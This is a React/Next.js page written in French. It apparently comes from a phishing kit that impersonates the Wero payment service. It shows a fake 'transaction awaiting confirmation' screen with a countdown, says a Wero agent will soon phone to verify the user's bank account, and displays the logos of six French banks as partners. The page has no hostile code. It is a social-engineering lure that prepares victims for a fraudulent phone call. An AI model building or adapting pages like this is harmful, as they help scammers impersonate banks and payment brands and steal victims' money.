'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { Check, Lock, Phone } from 'lucide-react';

export default function ConfirmPage() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(572); // 09:32 (572 secondes)

  // Gestion du compte à rebours dynamique
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
  const seconds = String(timeLeft % 60).padStart(2, '0');

  return (
    <div className="min-h-[100dvh] w-full bg-white text-slate-900 font-sans flex flex-col justify-between overflow-x-hidden select-none">
      
      {/* En-tête de l'application */}
      <header className="w-full px-5 py-3.5 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20 shrink-0">
        <Link href="/" className="flex items-center">
          <img src="/flavicon.ico" alt="Wero" className="h-8 w-8 object-contain" />
        </Link>

        {/* Bouton Hamburger */}
        <button
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          aria-label="Menu"
          className="p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none"
        >
          <div className="w-5 h-3.5 flex flex-col justify-between">
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
          </div>
        </button>
      </header>

      {/* Menu déroulant mobile */}
      {isMenuOpen && (
        <div className="absolute top-[60px] left-0 w-full bg-white/98 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30 animate-in fade-in slide-in-from-top-2 duration-200">
          <nav className="flex flex-col gap-2 font-medium text-slate-700">
            <Link 
              href="/" 
              className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold"
              onClick={() => setIsMenuOpen(false)}
            >
              Accueil
            </Link>
          </nav>
        </div>
      )}

      {/* Contenu principal de validation */}
      <main className="flex-1 px-5 py-6 max-w-md mx-auto w-full flex flex-col items-center text-center gap-4">
        
        {/* Titre Principal */}
        <h1 className="text-xl font-black text-slate-900 tracking-tight uppercase">
          PAIEMENT SANS PRISE DE TÊTE
        </h1>

        {/* Petit badge vert coché */}
        <div className="w-10 h-10 rounded-full bg-emerald-100 text-[#22C55E] flex items-center justify-center shrink-0">
          <Check className="w-6 h-6 stroke-[3]" />
        </div>

        {/* Sous-titre */}
        <h2 className="text-base font-bold text-slate-900">
          Transaction en attente de confirmation
        </h2>

        {/* Label Chronomètre */}
        <p className="text-xs font-semibold text-slate-500">
          Temps estimé avant l'appel :
        </p>

        {/* Compte à rebours dynamique */}
        <div className="flex items-center justify-center gap-4 my-1">
          <div className="flex flex-col items-center bg-slate-50 px-4 py-2.5 rounded-2xl border border-slate-100 shadow-sm min-w-[72px]">
            <span className="text-3xl font-black text-slate-900 tracking-tight">{minutes}</span>
            <span className="text-[10px] font-bold text-slate-500 uppercase mt-0.5">Minutes</span>
          </div>
          <span className="text-2xl font-black text-slate-300 animate-pulse">:</span>
          <div className="flex flex-col items-center bg-slate-50 px-4 py-2.5 rounded-2xl border border-slate-100 shadow-sm min-w-[72px]">
            <span className="text-3xl font-black text-slate-900 tracking-tight">{seconds}</span>
            <span className="text-[10px] font-bold text-slate-500 uppercase mt-0.5">Seconds</span>
          </div>
        </div>

        {/* Loader de chargement infini en cercle vert */}
        <div className="my-2">
          <div className="w-8 h-8 border-3 border-[#22C55E] border-t-transparent rounded-full animate-spin" />
        </div>

        {/* Badge Cadenas Orange */}
        <div className="w-10 h-10 rounded-full bg-amber-100 text-amber-500 flex items-center justify-center shrink-0 mt-2">
          <Lock className="w-5 h-5 fill-amber-500" />
        </div>
        <p className="text-sm font-semibold text-slate-700 leading-snug px-2">
          Pour garantir la sécurité de vos transactions, une vérification rapide et confidentielle est en cours.
        </p>

        {/* Badge Téléphone Rose/Rouge */}
        <div className="w-10 h-10 rounded-full bg-rose-100 text-rose-500 flex items-center justify-center shrink-0 mt-2">
          <Phone className="w-5 h-5 fill-rose-500" />
        </div>

        <p className="text-sm text-slate-700 leading-relaxed px-1">
          Un agent <strong className="font-bold text-slate-900">Wero</strong> vous contactera par téléphone dans les prochaines minutes (généralement sous <strong className="font-bold text-slate-900">2 à 5 minutes</strong>) afin de confirmer que vous êtes bien le/la titulaire du compte bancaire associé à votre profil.
        </p>

        <p className="text-xs text-slate-500 leading-relaxed px-1">
          Cette étape ne prend que quelques instants et permet de s'assurer que vos fonds seront transférés en toute sécurité, uniquement vers un compte vérifié.
        </p>

        {/* Deuxième petit badge vert coché */}
        <div className="w-10 h-10 rounded-full bg-emerald-100 text-[#22C55E] flex items-center justify-center shrink-0 mt-2">
          <Check className="w-6 h-6 stroke-[3]" />
        </div>

        {/* Bloc d'explication final */}
        <p className="text-sm font-bold text-slate-900 leading-relaxed px-1 mb-4">
          Merci pour votre patience — cette mesure protège votre argent et prévient toute utilisation frauduleuse du système. Vous n'avez rien à faire, restez simplement disponible pour l'appel.
        </p>

      </main>

      {/* Pied de page avec le label "NOS PARTENAIRES" */}
      <footer className="w-full px-5 py-5 border-t border-slate-100 bg-white text-center shrink-0">
        <p className="text-xs font-black text-slate-900 tracking-wider uppercase mb-3.5">
          NOS PARTENAIRES
        </p>
        <div className="flex items-center justify-center gap-3.5 flex-wrap">
          <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-5 object-contain" />
          <img src="/Banquepopulaire_logo.svg.webp" alt="Banque Populaire" className="h-5 object-contain" />
          <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-5 object-contain" />
          <img src="/12895685.png" alt="Caisse d'Épargne" className="h-5 object-contain" />
          <img src="/Crédit_Agricole.svg" alt="Crédit Agricole" className="h-5 object-contain" />
          <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-5 object-contain" />
        </div>
      </footer>

    </div>
  );
}
